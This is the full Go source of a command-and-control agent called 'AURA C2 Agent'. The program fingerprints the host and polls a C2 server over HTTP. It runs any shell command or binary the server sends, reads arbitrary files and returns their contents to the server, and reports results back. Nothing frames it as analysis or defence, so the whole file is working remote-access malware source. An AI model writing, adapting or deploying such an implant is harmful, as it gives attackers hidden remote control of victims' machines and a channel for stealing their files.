/*
AURA C2 AGENT

Lightweight command & control agent.
Features:
- HTTP beaconing to C2 server
- Task execution (shell commands, file ops, network)
- Agent persistence
- Error handling & retry logic
- JSON communication
*/
package main

import (
	"bytes"
	"crypto/md5"
	"encoding/hex"
	"encoding/json"
	"flag"
	"fmt"
	"io"
	"net"
	"net/http"
	"os"
	"os/exec"
	"os/user"
	"runtime"
	"time"
)

type Agent struct {
	ID              string    `json:"id"`
	Hostname        string    `json:"hostname"`
	Username        string    `json:"username"`
	OS              string    `json:"os"`
	Architecture    string    `json:"arch"`
	LastCheckin     time.Time `json:"last_checkin"`
	Version         string    `json:"version"`
	C2Server        string    `json:"-"`
	BeaconInterval  int       `json:"-"`
}

type Task struct {
	ID      string                 `json:"id"`
	Type    string                 `json:"type"`
	Command string                 `json:"command"`
	Args    map[string]interface{} `json:"args"`
}

type TaskResult struct {
	TaskID    string    `json:"task_id"`
	AgentID   string    `json:"agent_id"`
	Status    string    `json:"status"`
	Output    string    `json:"output"`
	Error     string    `json:"error,omitempty"`
	Timestamp time.Time `json:"timestamp"`
	Duration  float64   `json:"duration_ms"`
}

type BeaconRequest struct {
	Agent     Agent  `json:"agent"`
	Tasks     []int  `json:"completed_tasks"`
}

type BeaconResponse struct {
	Tasks    []Task `json:"tasks"`
	Action   string `json:"action"`
	Interval int    `json:"interval"`
}

func NewAgent(c2Server string, beaconInterval int) *Agent {
	hostname, _ := os.Hostname()
	user, _ := user.Current()
	username := user.Username

	mac := getMACAddress()
	hashData := fmt.Sprintf("%s:%s", hostname, mac)
	hash := md5.Sum([]byte(hashData))
	agentID := hex.EncodeToString(hash[:])[:16]

	return &Agent{
		ID:             agentID,
		Hostname:       hostname,
		Username:       username,
		OS:             runtime.GOOS,
		Architecture:   runtime.GOARCH,
		LastCheckin:    time.Now(),
		Version:        "2.1",
		C2Server:       c2Server,
		BeaconInterval: beaconInterval,
	}
}

func getMACAddress() string {
	interfaces, err := net.Interfaces()
	if err != nil {
		return "unknown"
	}

	for _, i := range interfaces {
		if i.Flags&net.FlagUp != 0 && i.Flags&net.FlagLoopback == 0 {
			return i.HardwareAddr.String()
		}
	}
	return "unknown"
}

func (a *Agent) Beacon() ([]Task, error) {
	request := BeaconRequest{
		Agent: *a,
		Tasks: []int{},
	}

	data, _ := json.Marshal(request)

	resp, err := http.Post(
		fmt.Sprintf("%s/api/c2/beacon", a.C2Server),
		"application/json",
		bytes.NewBuffer(data),
	)

	if err != nil {
		return nil, err
	}
	defer resp.Body.Close()

	if resp.StatusCode != 200 {
		return nil, fmt.Errorf("c2 returned status %d", resp.StatusCode)
	}

	var beaconResp BeaconResponse
	json.NewDecoder(resp.Body).Decode(&beaconResp)

	a.LastCheckin = time.Now()

	return beaconResp.Tasks, nil
}

func (a *Agent) ExecuteTask(task Task) TaskResult {
	start := time.Now()
	result := TaskResult{
		TaskID:    task.ID,
		AgentID:   a.ID,
		Status:    "success",
		Timestamp: start,
	}

	switch task.Type {
	case "shell":
		output, err := a.ExecuteShell(task.Command)
		if err != nil {
			result.Status = "error"
			result.Error = err.Error()
		} else {
			result.Output = output
		}

	case "exec":
		output, err := a.ExecuteCommand(task.Command, task.Args)
		if err != nil {
			result.Status = "error"
			result.Error = err.Error()
		} else {
			result.Output = output
		}

	case "info":
		result.Output = a.GetInfo()

	case "upload":
		err := a.UploadFile(task.Args)
		if err != nil {
			result.Status = "error"
			result.Error = err.Error()
		} else {
			result.Output = "File uploaded successfully"
		}

	case "download":
		data, err := a.DownloadFile(task.Args)
		if err != nil {
			result.Status = "error"
			result.Error = err.Error()
		} else {
			result.Output = string(data)
		}

	default:
		result.Status = "error"
		result.Error = fmt.Sprintf("Unknown task type: %s", task.Type)
	}

	result.Duration = time.Since(start).Seconds() * 1000
	return result
}

func (a *Agent) ExecuteShell(command string) (string, error) {
	var cmd *exec.Cmd

	if runtime.GOOS == "windows" {
		cmd = exec.Command("cmd", "/c", command)
	} else {
		cmd = exec.Command("/bin/sh", "-c", command)
	}

	output, err := cmd.CombinedOutput()
	return string(output), err
}

func (a *Agent) ExecuteCommand(name string, args map[string]interface{}) (string, error) {
	var cmdArgs []string
	if argsList, ok := args["args"].([]interface{}); ok {
		for _, arg := range argsList {
			cmdArgs = append(cmdArgs, fmt.Sprintf("%v", arg))
		}
	}

	cmd := exec.Command(name, cmdArgs...)
	output, err := cmd.CombinedOutput()
	return string(output), err
}

func (a *Agent) GetInfo() string {
	info := map[string]string{
		"id":           a.ID,
		"hostname":     a.Hostname,
		"username":     a.Username,
		"os":           a.OS,
		"arch":         a.Architecture,
		"version":      a.Version,
		"last_checkin": a.LastCheckin.Format(time.RFC3339),
	}

	data, _ := json.MarshalIndent(info, "", "  ")
	return string(data)
}

func (a *Agent) UploadFile(args map[string]interface{}) error {
	src, ok := args["src"].(string)
	if !ok {
		return fmt.Errorf("missing src parameter")
	}

	dst, ok := args["dst"].(string)
	if !ok {
		return fmt.Errorf("missing dst parameter")
	}

	file, err := os.Open(src)
	if err != nil {
		return err
	}
	defer file.Close()

	outFile, err := os.Create(dst)
	if err != nil {
		return err
	}
	defer outFile.Close()

	_, err = io.Copy(outFile, file)
	return err
}

func (a *Agent) DownloadFile(args map[string]interface{}) ([]byte, error) {
	path, ok := args["path"].(string)
	if !ok {
		return nil, fmt.Errorf("missing path parameter")
	}

	return os.ReadFile(path)
}

func (a *Agent) ReportResult(result TaskResult) error {
	data, _ := json.Marshal(result)

	resp, err := http.Post(
		fmt.Sprintf("%s/api/c2/result", a.C2Server),
		"application/json",
		bytes.NewBuffer(data),
	)

	if err != nil {
		return err
	}
	defer resp.Body.Close()

	if resp.StatusCode != 200 {
		return fmt.Errorf("c2 returned status %d", resp.StatusCode)
	}

	return nil
}

func (a *Agent) Start() {
	fmt.Printf("[*] AURA C2 Agent Started\n")
	fmt.Printf("[*] Agent ID: %s\n", a.ID)
	fmt.Printf("[*] C2 Server: %s\n", a.C2Server)
	fmt.Printf("[*] Beacon Interval: %ds\n", a.BeaconInterval)

	for {
		tasks, err := a.Beacon()
		if err != nil {
			fmt.Printf("[-] Beacon error: %v\n", err)
			time.Sleep(time.Duration(a.BeaconInterval*2) * time.Second)
			continue
		}

		fmt.Printf("[*] Received %d tasks\n", len(tasks))

		for _, task := range tasks {
			fmt.Printf("[*] Executing task: %s (%s)\n", task.ID, task.Type)

			result := a.ExecuteTask(task)

			err := a.ReportResult(result)
			if err != nil {
				fmt.Printf("[-] Error reporting result: %v\n", err)
			} else {
				fmt.Printf("[+] Result reported\n")
			}
		}

		time.Sleep(time.Duration(a.BeaconInterval) * time.Second)
	}
}

func main() {
	c2Server := flag.String("c2", "http://localhost:9000", "C2 server URL")
	interval := flag.Int("interval", 30, "Beacon interval (seconds)")

	flag.Parse()

	agent := NewAgent(*c2Server, *interval)
	agent.Start()
}
